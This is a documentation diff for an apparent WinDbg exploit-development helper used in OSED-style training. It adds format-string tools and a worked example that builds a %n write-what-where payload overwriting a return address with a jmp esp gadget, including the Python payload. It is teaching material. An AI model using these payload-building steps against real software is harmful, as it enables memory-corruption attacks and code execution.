@@ -29,6 +29,72 @@ Use `dx @$osed().last_result()` to inspect the full structured `CommandResult`.
 | `nop` | `dx @$osed().nop(length, byte?)` | `dx @$osed().nop(16)` | Generates a NOP sled. |
 | `rop_template` | `dx @$osed().rop_template(api?, module?)` | `dx @$osed().rop_template("VirtualProtect", "essfunc")` | Prints a commented ROP chain skeleton. |
 
+## Format String Namespace
+
+The `fmt` namespace supports the format-string specifier modules: build `%n` write-what-where payloads and locate the controlled parameter index at a live `printf`-family call.
+
+| Helper | Syntax | Example | Notes |
+| --- | --- | --- | --- |
+| `fmt.build` | `dx @$osed().fmt.build(addr, value, argIndex, width?, exclude?)` | `dx @$osed().fmt.build(0x00402118, 0x625011AF, 6)` | Builds a `%n` write-what-where payload (address block + format string + Python). Positional form writes one dword; use the object form from JS for multiple writes: `fmt.build({ writes: [{addr,value},...], argIndex: 6, width: "word" })`. |
+| `fmt.offset` | `dx @$osed().fmt.offset(marker?, count?, firstArg?)` | `dx @$osed().fmt.offset(0x41414141, 40)` | At a breakpoint on the format call, reports which `%N$` index reaches your buffer and classifies leakable stack/module pointers. `firstArg` (default 8) is the byte offset from ESP to the first vararg. x86/cdecl. |
+
+`width` is `"byte"` (`%hhn`), `"word"` (`%hn`, default), or `"dword"` (`%n`). The builder lays the target addresses in a front block, sorts writes by ascending value so `%c` padding stays non-negative, and accounts for the address-block bytes already printed — the off-by-block error students hit by hand.
+
+### Worked example
+
+Goal: overwrite a saved return address at `0x00402118` with the address of a `jmp esp` gadget, `0x625011AF`, via a `printf(user_buffer)` call.
+
+**1. Break at the format call and locate your parameter index.** Send a buffer beginning with a marker (`AAAA` = `0x41414141`), break on the `printf`, then:
+
+```
+0:000> dx @$osed().fmt.offset(0x41414141, 40)
+
+=== Format String Parameter Map ===
+[+] ESP: 0x0019FE40  firstArg: +8  marker: 0x41414141
+[+] Controlled parameter index: %6$  (use argIndex 6 in fmt.build)
+Idx    StackAddr    Value        Meaning
+%6$    0x0019FE48   41414141     marker
+%7$    0x0019FE4C   77C12340     ptr->kernel32
+%8$    0x0019FE50   0019FEC0     ptr->stack
+%9$    0x0019FE54   00402000     ptr->KERNELBASE
+```
+
+Your buffer is reachable at `%6$`. (The `ptr->*` slots are candidate `%N$s` leaks for defeating ASLR in a separate step.)
+
+**2. Build the write with that index.**
+
+```
+0:000> dx @$osed().fmt.build(0x00402118, 0x625011AF, 6)
+
+=== Format String Builder ===
+[+] Writes:   1 (word-granularity, 2 chunks)
+[+] ArgIndex: 6  Prefix: 0
+
+=== Chunk breakdown ===
+Chunk  TargetAddr    Value    Arg   CumCount   Specifier
+0      0x00402118    0x11AF   6     4527       %4519c%6$hn
+1      0x0040211A    0x6250   7     25168      %20641c%7$hn
+
+=== Address block ===
+  18 21 40 00    ; slot 0 -> %6$  (0x00402118)
+  1A 21 40 00    ; slot 1 -> %7$  (0x0040211A)
+
+=== Format string ===
+%4519c%6$hn%20641c%7$hn
+
+=== Python ===
+def p32(v): return struct.pack('<I', v)
+payload = (
+    p32(0x00402118) +
+    p32(0x0040211A) +
+    b"%4519c%6$hn%20641c%7$hn"
+)
+```
+
+The two address dwords occupy `%6$`/`%7$`; the low word `0x11AF` is written first (smaller value → less padding), then the high word `0x6250`. Note the first pad is `4519`, not `4527` — the 8-byte address block is already printed before the first `%c`, which is exactly the accounting the builder does for you.
+
+If a target address contains a badchar (e.g. a null in `0x00402118`), pass `exclude` and the builder warns that the address itself cannot be delivered — that constraint is on the buffer, not something an encoder can fix.
+
 ## Semantic ROP Namespace
 
 The `rop` runtime namespace is a semantic query surface layered on top of RP++ output. Load a corpus first with `rop.scan(...)`, then query it with `rop.query(...)` or inspect the derived capability catalog with `rop.capabilities()`.
